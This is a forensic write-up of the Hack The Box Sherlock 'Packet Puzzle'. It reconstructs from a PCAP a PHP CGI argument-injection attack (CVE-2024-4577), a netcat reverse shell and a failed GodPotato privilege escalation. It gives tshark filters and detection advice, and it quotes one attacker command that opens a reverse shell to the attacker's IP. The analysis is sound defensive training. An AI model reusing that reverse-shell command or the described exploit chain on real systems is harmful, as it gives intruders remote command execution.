---
sherlock: Packet Puzzle
domain: DFIR / Network
difficulty: Medium
platform: Hack The Box
evidence: PCAP from a Japanese cryptocurrency company
tools: [Wireshark, tshark, CyberChef]
state: Retired
tags: [dfir, pcap, cve-2024-4577, php, godpotato, t1190]
---

# Packet Puzzle — Hack The Box (Sherlock)

**English** | [🇪🇸 Español](README.md)

> Defensive investigation. No platform answers copied.
>
> **Verdict: `[CORREGIDO]`.** The note described an **RDP** logon followed by **SMB** lateral movement; no public writeup supports that. Cross-checked against **cyb3rloud** and **FinalBreach**, the case is a **PHP CGI argument injection (CVE-2024-4577)** exploited over HTTP POST, plus a **GodPotato** escalation attempt that **fails**. The whole chain has been rewritten.

## Scenario

You are a junior analyst at a small Japanese cryptocurrency trading company. After spotting suspicious activity on the internal network, you export a PCAP: decide whether the environment was compromised and rebuild the attacker's steps.

## Evidence

- `NetworkTraffic.pcap` inside the password-protected ZIP shipped with the Sherlock.
- Attacker `192.168.170.128` (1,083 packets towards the victim) and server `192.168.170.130`.

## Method

### 1. Who talks and how many ports are open

`Statistics → Conversations → IPv4` sorted by packets leaves the source `192.168.170.128` on top of the traffic towards `.130`. To count what **answers**, look at the server's SYN-ACKs, not the attacker's SYNs:

```bash
tshark -r NetworkTraffic.pcap \
  -Y "ip.src == 192.168.170.130 && ip.dst == 192.168.170.128 && tcp.flags.syn == 1 && tcp.flags.ack == 1" \
  -T fields -e tcp.srcport | sort -u
```

Eight ports: **22, 80, 135, 139, 443, 445, 3389 and 5357**. The first one to reply, in chronological order, is **22**.

### 2. The real vector: HTTP POST against PHP

Port 3389 is open but **unused**: there is no RDP session and no credential attempt. Entry is HTTP. Filter the attacker's POSTs and follow the stream:

```bash
tshark -r NetworkTraffic.pcap -Y 'http.request.method == "POST" && ip.src == 192.168.170.128' \
  -T fields -e frame.number -e frame.time -e http.request.uri
```

`Follow → HTTP Stream` shows **PHP 8.1.25** and a command executed by the interpreter: this is **CVE-2024-4577**, argument injection in PHP's CGI on Windows that turns an HTTP request into command execution. The `whoami` in the same conversation returns **`cristo`**.

- Foothold: **2025-01-22 09:47:32** (packet carrying the reverse shell's `TCPClient`).
- Technique: **T1190 — Exploit Public-Facing Application**.

### 3. Reverse shell and escalation tooling

After the POST the attacker downloads **`nc64.exe`** from their own IP and opens an interactive console to port **4545**:

```bash
tshark -r NetworkTraffic.pcap -Y 'tcp.port == 4545' -T fields -e ip.src -e ip.dst -e tcp.len
tshark -r NetworkTraffic.pcap -Y 'frame contains ".exe"' -V | grep -i "exe"
```

That session shows an `iwr` (Invoke-WebRequest) of **`GodPotato-NET4.exe`**: the attacker downloads it and runs it **in memory**. Then:

```text
./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"
```

### 4. The attempt fails

The reply arrives on the same 4545 stream:

```text
Cannot create process Win32Error:2
```

`Win32Error:2` means "file not found": the binary, or the `time.exe` it expected, **does not exist** at that path, so the escalation never completes. The case ends with access as `cristo`, no SYSTEM.

### 5. Timeline

1. Recon sweep and 8 open ports (22 first).
2. POST with CVE-2024-4577 → execution as `cristo` (09:47:32).
3. `nc64.exe` → reverse shell on 4545.
4. `GodPotato-NET4.exe` in memory, then `TimeProvider.exe -cmd ...` → `Win32Error:2`.
5. No RDP, no SMB, no lateral movement: the compromise stays on one host.

## Findings

- The vector is **web**, not RDP: an open 3389 is surface, not entry, and confusing the two was the previous note's mistake.
- The whole chain lives in the PCAP: scan → POST → shell → download → failed escalation.
- The failed escalation matters as much as the access: `Win32Error:2` proves the attacker did **not** reach SYSTEM.

## Lessons

- Count SYN-ACKs, not SYNs: open ports are the ones that answer, and their temporal order gives the first one.
- `Follow → HTTP Stream` turns an obfuscated POST into readable code: version, user and command all appear there.
- `http contains "client"` finds the reverse shell through PowerShell's `TCPClient` without guessing the port.

## Detection and mitigation

- Patch PHP: CVE-2024-4577 affects Windows installs running CGI with certain code pages; disable CGI mode when it is not required.
- Restrict egress from web servers to needed destinations: the reverse shell to 4545 dies without egress.
- Detection: POSTs to `php-cgi` carrying argument characters (`%ad`, `%2d`) and `php-cgi` processes with `cmd.exe` children; in-memory GodPotato and binaries pulled with `iwr`.

## References

- cyb3rloud, *Packet Puzzle Sherlock Writeup*: <https://cyb3rloud.medium.com/packet-puzzle-sherlock-writeup-hack-the-box-3fd0eaf6f3d8>
- FinalBreach, *Write Up of Packet Puzzle*: <https://finalbreach.com/posts/HackTheBox-Packet-Puzzle-WriteUp/>
